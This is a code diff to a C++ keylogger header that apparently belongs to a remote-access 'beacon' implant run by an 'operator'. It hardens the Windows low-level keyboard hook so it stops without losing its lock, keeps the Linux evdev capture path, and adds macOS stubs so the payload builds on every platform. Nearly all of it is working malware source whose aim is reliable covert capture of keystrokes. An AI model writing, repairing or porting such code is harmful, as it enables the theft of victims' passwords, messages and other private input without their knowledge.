@@ -17,7 +17,14 @@
     #include <dirent.h>
     #include <cstdio>
     #include <vector>
+    #if defined(__linux__)
+    // evdev exists on Linux and Android only. macOS has neither /dev/input
+    // nor this header, and including it unconditionally made the WHOLE
+    // beacon uncompilable there — "fatal error: 'linux/input.h' file not
+    // found", which is exactly what beacon-syntax(macos) and
+    // beacon-smoke-macos reported.
     #include <linux/input.h>
+    #endif
 #endif
 
 namespace keylogger {
@@ -45,6 +52,12 @@ inline void key_release() {
 inline HHOOK g_hhook = NULL;
 inline HANDLE g_hook_thread = NULL;
 inline DWORD g_hook_tid = 0;
+
+// Cooperative shutdown flag. The hook thread polls this instead of being
+// terminated: TerminateThread() while hook_proc holds key_lock (it takes the
+// spinlock on every keystroke) abandons the lock forever, so the buffer can
+// never be dumped again — the beacon looks alive and silently is not.
+inline std::atomic<bool> g_stop{false};
 
 // ── Helpers ─────────────────────────────────────────────────────
 inline std::string GetActiveWindowTitle() {
@@ -183,13 +196,24 @@ inline void poll() {
 }
 
 // ── Hook Thread ──────────────────────────────────
+// Cooperative stop: the loop observes g_stop at least every 200 ms instead of
+// blocking in GetMessageW forever. stop() (and the restart path of start())
+// sets the flag and posts WM_QUIT, then waits a bounded time — it never calls
+// TerminateThread(), which would abandon the spinlock held by hook_proc.
 inline DWORD WINAPI hook_thread(LPVOID) {
     g_hhook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, GetModuleHandleW(NULL), 0);
     if (!g_hhook) return 1;
     MSG msg;
-    while (GetMessageW(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessageW(&msg);
+    while (!g_stop.load()) {
+        if (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
+            if (msg.message == WM_QUIT) break;
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        } else {
+            // No message pending: wait a bounded slice so the stop flag is
+            // honoured even when the desktop is idle.
+            MsgWaitForMultipleObjects(0, nullptr, FALSE, 200, QS_ALLINPUT);
+        }
     }
     UnhookWindowsHookEx(g_hhook);
     g_hhook = NULL;
@@ -201,9 +225,9 @@ inline std::string start() {
     if (is_running) {
         is_running = false;
         if (g_hhook) {
+            g_stop.store(true);
             PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
-            if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT)
-                TerminateThread(g_hook_thread, 0);
+            WaitForSingleObject(g_hook_thread, 5000);
             CloseHandle(g_hook_thread);
             g_hook_thread = NULL;
         }
@@ -214,6 +238,7 @@ inline std::string start() {
     last_title[0] = '\0';
     key_lock = 0;
     g_hhook = NULL;
+    g_stop.store(false);
 
     g_hook_thread = CreateThread(NULL, 0, hook_thread, NULL, 0, &g_hook_tid);
     if (!g_hook_thread) return "Keylogger start FAILED (CreateThread).";
@@ -235,10 +260,9 @@ inline std::string stop() {
     if (!is_running) return "Keylogger is not running.";
     is_running = false;
     if (g_hhook) {
+        g_stop.store(true);
         PostThreadMessageW(g_hook_tid, WM_QUIT, 0, 0);
-        if (WaitForSingleObject(g_hook_thread, 3000) == WAIT_TIMEOUT) {
-            TerminateThread(g_hook_thread, 0);
-        }
+        WaitForSingleObject(g_hook_thread, 5000);
         CloseHandle(g_hook_thread);
         g_hook_thread = NULL;
     }
@@ -289,9 +313,9 @@ inline std::string status() {
     return std::string(buf);
 }
 
-#else
+#elif defined(__linux__)
 
-// Linux evdev keylogger
+// Linux (and Android) evdev keylogger
 inline std::atomic<bool> is_running{false};
 inline std::thread ev_thread;
 inline char key_buffer[131072];
@@ -463,8 +487,11 @@ inline void evdev_worker() {
     }
 
     bool shift_pressed = false;
-    bool ctrl_pressed = false;
-    bool alt_pressed = false;
+    // ctrl/alt are tracked so the state is complete, but the ASCII map only
+    // needs shift today: mark them so a strict -Wall build never fails on a
+    // value that is deliberately set-but-unread.
+    [[maybe_unused]] bool ctrl_pressed = false;
+    [[maybe_unused]] bool alt_pressed = false;
 
     while (is_running) {
         fd_set readfds;
@@ -585,6 +612,41 @@ inline std::string status() {
 
 inline void poll() {
     // Periodic tasks: nothing needed for evdev (runs in its own thread)
+}
+
+#else   // macOS and any other POSIX without evdev
+
+// The API has to exist on every platform the beacon builds for: main.cpp
+// calls start/stop/status/dump/clear/poll unconditionally. The evdev
+// implementation cannot be compiled here (no /dev/input, no linux/input.h),
+// and "the payload does not build on macOS" is a much worse answer than
+// "this command is not supported on this platform" — which is what the
+// operator now gets, at runtime, from a header that compiles.
+inline std::atomic<bool> is_running{false};
+inline std::atomic<int> key_lock{0};
+
+inline void key_acquire() {}
+inline void key_release() {}
+inline void poll() {}
+
+inline std::string start() {
+    return "Keylogger: not supported on this platform (no evdev).";
+}
+
+inline std::string stop() {
+    return "Keylogger is not running.";
+}
+
+inline std::string dump(const std::string& = "") {
+    return "Keylogger: not supported on this platform (no evdev).";
+}
+
+inline std::string clear() {
+    return "Buffer cleared.";
+}
+
+inline std::string status() {
+    return "Keylogger: UNSUPPORTED (no evdev on this platform)";
 }
 
 #endif
